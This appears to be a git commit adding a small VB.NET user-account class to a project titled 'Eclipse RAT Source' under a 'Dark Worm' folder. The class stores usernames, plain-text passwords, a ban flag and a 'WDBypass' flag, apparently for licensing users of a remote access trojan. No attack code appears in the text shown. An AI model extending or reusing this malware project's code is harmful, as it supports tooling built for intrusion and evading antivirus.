9fdfad121bf5c606c71e778d1084fea1a154d774
127.0.0.1 <125826136+MJMODZZ-V3@users.noreply.github.com>
2023-06-08 01:20:46 +0200

    🎆 Eclipse RAT Source 🎆

---
+++ Holy/Dark Worm/Users/UsersInfo.vb
@@ -0,0 +1,25 @@
+﻿Public Class UsersInfo
+    Public Property Username() As String
+    Public Property Password() As String
+    Public Property UUID() As String
+    Public Property ClientIsRegistered() As Boolean
+    Public Property WDBypass() As Boolean
+    Public Property BAN() As Boolean
+
+    Public Property CreationDate() As String
+
+    Public Shared Function isEqual(user1 As UsersInfo, user2 As UsersInfo)
+        If (user1 Is Nothing Or user2 Is Nothing) Then
+
+            Return False
+        End If
+        If (user1.Username <> user2.Username) Then
+
+            Return False
+        ElseIf (user1.Password <> user2.Password) Then
+
+            Return False
+        End If
+        Return True
+    End Function
+End Class
